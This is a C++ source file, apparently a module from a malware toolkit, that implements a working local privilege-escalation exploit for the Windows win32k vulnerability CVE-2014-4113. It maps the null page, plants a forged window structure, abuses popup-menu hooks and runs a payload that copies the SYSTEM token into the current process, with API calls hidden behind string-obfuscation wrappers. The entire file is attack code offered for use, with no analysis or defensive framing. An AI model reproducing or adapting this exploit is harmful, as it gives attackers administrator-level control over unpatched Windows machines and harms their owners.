#include "core\core.h"
#include "core\debug.h"

namespace Elevation
{

#ifndef _SYSTEM_MODULE_INFORMATION_ENTRY

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID  MappedBase;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

#endif

typedef LPVOID PEPROCESS;
typedef int(__stdcall *PZWQUERYSYSTENINFORMATION)(DWORD, PVOID, DWORD, PDWORD);
typedef int(__stdcall *PZWALLOCATEVIRTUALMEMORY) (HANDLE, PVOID, ULONG, PDWORD,	ULONG, ULONG);
typedef int(__stdcall *PLOOKUPPROCESSBYID)(DWORD, PEPROCESS *);
typedef	LPVOID(__stdcall *PTICURRENT)();

static PZWQUERYSYSTENINFORMATION fpQuerySysInfo = NULL;
static PZWALLOCATEVIRTUALMEMORY  fpAllocateVirtualMem = NULL;
static PLOOKUPPROCESSBYID		 fpLookupProcessById = NULL;

static DWORD dwTokenOffset = 0;
static DWORD gFlag1 = 0;
static DWORD gFlag2 = 0;
static DWORD gFlag3 = 0;

static WNDPROC lpPrevWndFunc = NULL;

static DWORD dwCurProcessId = 0;
static DWORD dwSystemProcessId = 0;

#ifdef _WIN64
#define GWL_WNDPROC -4
#endif

static int InitTokenOffset()
{
	OSVERSIONINFOA VerInfo;
	Mem::Zero(VerInfo);
	VerInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	if (!API(KERNEL32, GetVersionExA)((LPOSVERSIONINFOA)&VerInfo)) return 0;

	int result = 1;
	if (VerInfo.dwMajorVersion == 5)
	{
		switch (VerInfo.dwMinorVersion)
		{
			case 0:
				  dwTokenOffset = 0x12C;
				  break;
			case 1:
				  dwTokenOffset = 0x0C8;
				  break;
			case 2:
				  dwTokenOffset = 0x0D8;
				  break;
			default:
				   dwTokenOffset = 0x0C8;
		}
	}
	else if (VerInfo.dwMajorVersion == 6)
	{
		switch (VerInfo.dwMinorVersion)
		{
			case 0:
				  dwTokenOffset = 0x0E0;
				  break;
			case 1:
				  dwTokenOffset = 0x0F8;
				  break;
			default:
				   result = 0;
		}
	}
	else
		result = 0;

	if( !result )
		DbgMsg( "FAIL : InitTokenOffset" );

	return result;
}

static HMODULE GetKrnlNtBase(char *szNtName)
{
	char  Buffer[0xA];
	DWORD dwRetLength;

	int SystemModuleInfo = 0x0B;
	if( fpQuerySysInfo( SystemModuleInfo, Buffer, 0x0A, &dwRetLength ) != 0xC0000004 )
	{
		DbgMsg( "FAILED QuerySysInfo()");
		return 0;
	}

	PSYSTEM_MODULE_INFORMATION pBuf = (PSYSTEM_MODULE_INFORMATION)API(KERNEL32, LocalAlloc)( LMEM_ZEROINIT, dwRetLength );
	HMODULE hModuleBase = NULL;

	if( fpQuerySysInfo( SystemModuleInfo, pBuf, dwRetLength, &dwRetLength ) == 0 )
	{
		PSYSTEM_MODULE_INFORMATION_ENTRY pModEntry = pBuf->Module;

		for( DWORD i = 0; i < pBuf->Count; i++ )
		{
			//ASCII "\SystemRoot\system32\ntkrnlpa.exe"
			if( Str::IndexOf( pModEntry->ImageName, _CS_("nt"), -1, 2 ) > 0  && Str::IndexOf( pModEntry->ImageName, _CS_("exe"), -1, 3 ) > 0 )
			{
				/// strcpy_s(szNtName, 0x104, (char*)((DWORD)pModEntry->ImageName + pModEntry->PathLength));
				Str::Copy( szNtName, (char*)((DWORD)pModEntry->ImageName + pModEntry->PathLength), MAX_PATH );
				hModuleBase = (HMODULE)(pModEntry->Base);
				break;
			}
			pModEntry++;
		}

		if( hModuleBase == NULL )
			DbgMsg( "FAIL : Get Ntoskrnl Base" );
	}
	API(KERNEL32, LocalFree)(pBuf);
	return hModuleBase;
}

static bool InitExpVars()
{
	HMODULE hNtdll = API(KERNEL32, LoadLibraryA)( _CS_("ntdll.dll") );

	if( hNtdll == NULL )
	{
		DbgMsg( "FAIL : hNtdll == NULL" );
		return 0;
	}

	bool ret = false;
	fpQuerySysInfo = (PZWQUERYSYSTENINFORMATION)API(KERNEL32, GetProcAddress)( hNtdll, _CS_("ZwQuerySystemInformation") );
	fpAllocateVirtualMem = (PZWALLOCATEVIRTUALMEMORY)API(KERNEL32, GetProcAddress)( hNtdll, _CS_("ZwAllocateVirtualMemory") );

	if( fpQuerySysInfo && fpAllocateVirtualMem )
	{
		char NtKernelName[MAX_PATH];

		HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName);
		HMODULE hUserNtBase = API(KERNEL32, LoadLibraryA)(NtKernelName);

		fpLookupProcessById = (PLOOKUPPROCESSBYID)((DWORD)API(KERNEL32, GetProcAddress)(hUserNtBase, _CS_("PsLookupProcessByProcessId")) - (DWORD)hUserNtBase + (DWORD)hKrnlNtBase);
		dwCurProcessId = API(KERNEL32, GetCurrentProcessId)();
		dwSystemProcessId = 4;
		API(KERNEL32, FreeLibrary)(hUserNtBase);
		ret= true;
	}
	else
		DbgMsg( "FAIL : GetProcAddress ZwQuerySystemInformation or ZwAllocateVirtualMemory" );

	API(KERNEL32, FreeLibrary)(hNtdll);

	return ret;
}

static LPVOID CallPtiCurrent()
{
	LPVOID  result = NULL;
	PVOID   dstFunc;

	HMODULE hUser32 = API(KERNEL32, LoadLibraryA)( _CS_("user32.dll") );

	if( hUser32 )
	{
		dstFunc = (PVOID)API(KERNEL32, GetProcAddress)( hUser32, _CS_("AnimateWindow") );
		if( gFlag2 ) // gFlag2 always zero in win32 exp
		{
			dstFunc = (PVOID)API(KERNEL32, GetProcAddress)( hUser32, _CS_("CreateSystemThreads") );
		}
		if( dstFunc && *(WORD*)hUser32 == 0x5A4D )
		{
			IMAGE_NT_HEADERS *pPEHead = (IMAGE_NT_HEADERS *)((DWORD)hUser32 + *(DWORD*)((DWORD)hUser32 + 0x3C));

			DWORD dwImageBase = pPEHead->OptionalHeader.ImageBase;
			DWORD dwImageBound = pPEHead->OptionalHeader.SizeOfImage + dwImageBase;

			PBYTE p = (PBYTE)dstFunc;

			// search function 'PtiCurrent' address in code segment
			for( DWORD i = 0; i < 70; i++ )
			{
				if( (*p == 0xE8 && gFlag2 == 0) || (*p == 0xE9 && gFlag2) )
				{
					if( (DWORD)p < dwImageBase || (DWORD)p > dwImageBound ) break;

					PTICURRENT fnPtiCurrent;
					fnPtiCurrent = (PTICURRENT)(*(DWORD*)(p + 1) + (DWORD)p + 5);

					result = fnPtiCurrent(); // result == pointer tagTHREADINFO 

					break;
				}
				p++;
			}
		}
		API(KERNEL32, FreeLibrary)(hUser32);
	}
	return result;
}

// This is our fake 'WndProc' used to exploit
static LRESULT CALLBACK ShellCode( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	PEPROCESS pCur, pSys;
	fpLookupProcessById( dwCurProcessId, &pCur );
	fpLookupProcessById( dwSystemProcessId, &pSys );
	*(DWORD*)((DWORD)pCur + dwTokenOffset) = *(DWORD*)((DWORD)pSys + dwTokenOffset);
	return  0;
}

static int InitExploitMem( LPVOID *pAllocAddr )
{
	LPVOID pThreadInfo = CallPtiCurrent();

	*(DWORD*)pAllocAddr = 1;
	DWORD dwRegionSize = 0x2000;

	int iret = fpAllocateVirtualMem( API(KERNEL32, GetCurrentProcess)(), pAllocAddr, 0, &dwRegionSize,
									MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
									PAGE_EXECUTE_READWRITE );
	if( iret )
	{
		DbgMsg( "Allocate Mem Failed" );
		return 0;
	}

	*(DWORD*)(0x3) = (DWORD)pThreadInfo;  // 3-(-5)    = 8   
	*(BYTE*)(0x11) = (BYTE)4;             // 17-(-5)   = 0x16, bServerSideWindowProc 
	*(DWORD*)(0x5B) = (DWORD)ShellCode;    // 0x5B-(-5) = 0x60, lpfnWndProc

	return 1;
}

static LRESULT CALLBACK MyWndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	if( uMsg == WM_ENTERIDLE ) // 0x121
	{
		if( gFlag1 != 1 )
		{
			gFlag1 = 1;
			PostMessageA(hWnd, WM_KEYDOWN, 0x28, 0);
			PostMessageA(hWnd, WM_KEYDOWN, 0x27, 0);
			PostMessageA(hWnd, WM_LBUTTONDOWN, 0x00, 0);
		}
	}
	return API(USER32, DefWindowProcA)( hWnd, uMsg, wParam, lParam );
}

static HMENU InitPopupMenu()
{
	MENUITEMINFO Item1, Item2;
	HMENU        hMenu1, hMenu2;

	Mem::Set( &Item1, 0, sizeof(Item1) );
	Mem::Set( &Item2, 0, sizeof(Item2) );

	hMenu1 = API(USER32, CreatePopupMenu)();
	if( hMenu1 == NULL ) return 0;

	Item1.cbSize = sizeof(Item1);
	Item1.fMask = MIIM_STRING; // Retrieves or sets the dwTypeData member.
	if( API(USER32, InsertMenuItemA)( hMenu1, 0, TRUE, (LPCMENUITEMINFOA)&Item1 ) == FALSE )
	{
		API(USER32, DestroyMenu)(hMenu1);
		return NULL;
	}

	hMenu2 = API(USER32, CreatePopupMenu)();
	if( hMenu2 == NULL ) return NULL;

	static char szMenuText[2];
	szMenuText[0] = ' ' ;
	szMenuText[1] = 0;

	Item2.fMask = MIIM_STRING | MIIM_SUBMENU;
	Item2.dwTypeData = szMenuText;
	Item2.cch = 1;             // length of szMenuText
	Item2.hSubMenu = hMenu1;
	Item2.cbSize = sizeof(Item2);

	if ( API(USER32, InsertMenuItemA)( hMenu2, 0, TRUE, (LPCMENUITEMINFOA)&Item2 ) == FALSE )
	{
		DbgMsg( "InsertMenuItem FAIL [%d]", GetLastError() );
		API(USER32, DestroyMenu)(hMenu1);
		API(USER32, DestroyMenu)(hMenu2);
		return NULL;
	}
	return hMenu2;
}

static LRESULT CALLBACK NewWndProc( HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam )
{
	if( uMsg != 0x1EB )
	{
		return API(USER32, CallWindowProcA)( lpPrevWndFunc, hWnd, uMsg, wParam, lParam );
	}
	API(USER32, EndMenu)();
	return -5;
}

static LRESULT CALLBACK WndProcHook( int nCode, WPARAM wParam, LPARAM lParam )
{
	CWPSTRUCT *pWndProcArgs = (CWPSTRUCT*)lParam;

	if( pWndProcArgs->message == 0x1EB ) // MN_FINDMENUWINDOWFROMPOINT
	{
		if( !gFlag3 )
		{
			gFlag3 = 1;
			if( API(USER32, UnhookWindowsHook)( WH_CALLWNDPROC, WndProcHook ) )
			{
				lpPrevWndFunc = (WNDPROC)(API(USER32, SetWindowLongA)( pWndProcArgs->hwnd, GWL_WNDPROC, (LONG)NewWndProc ));
			}
		}
	}
	return API(USER32, CallNextHookEx)( NULL, nCode, wParam, lParam );
}

static DWORD WINAPI ThreadProc(LPVOID lParam)
{
	WNDCLASSA    wc;
	SYSTEM_INFO SystemInfo;
	HWND        hWnd;
	int         result = 0;
	LPVOID 		pAllocAddr;

	Mem::Set( &SystemInfo, 0, 0x24 );
	Mem::Set( &wc, 0, sizeof(wc) );

	wc.lpfnWndProc = MyWndProc;
	wc.lpszClassName = _CS_("woqunimalegebi");

	//GetNativeSystemInfo(&SystemInfo);
	//if(SystemInfo.dwOemId == PROCESSOR_ARCHITECTURE_AMD64) return 0 ; 

	API(USER32, RegisterClassA)(&wc);
	hWnd = API(USER32, CreateWindowExA)( 0, (LPCSTR)wc.lpszClassName, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0 );
	if (hWnd == NULL) return 0;

	InitExploitMem(&pAllocAddr);

	HMENU hMenu2 = InitPopupMenu();

	if( hMenu2 )
	{
		DWORD dwThreadId = API(KERNEL32, GetCurrentThreadId)();
		if( API(USER32, SetWindowsHookExA)( WH_CALLWNDPROC, WndProcHook, 0, dwThreadId ) )
		{
			if( API(USER32, TrackPopupMenu)( hMenu2, 0, -10000, -10000, 0, hWnd, 0 ) )
			{
				API(USER32, PostMessageA)( hWnd, 0, 0, 0 );
				result = 1;
			}
		}
	}

	API(USER32, DestroyWindow)(hWnd);
	if( hMenu2 )
	{
		API(USER32, DestroyMenu)(hMenu2);
	}
	API(USER32, UnhookWindowsHook)( WH_CALLWNDPROC, WndProcHook );
	API(KERNEL32, VirtualFree)( pAllocAddr, 0, MEM_RELEASE );
	return result;
}

bool CVE2014_4113()
{
	if( !InitTokenOffset() ) return false;
	if( !InitExpVars() ) return false;

	HANDLE hThread = API(KERNEL32, CreateThread)( 0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, 0, 0, 0 );

	if( API(KERNEL32, WaitForSingleObject)( hThread, 300000 ) )
	{
		API(KERNEL32, TerminateThread)( hThread, 0 );
		DbgMsg( "FAIL [%d]", GetLastError() );
		return false;
	}
	return true;
}

}
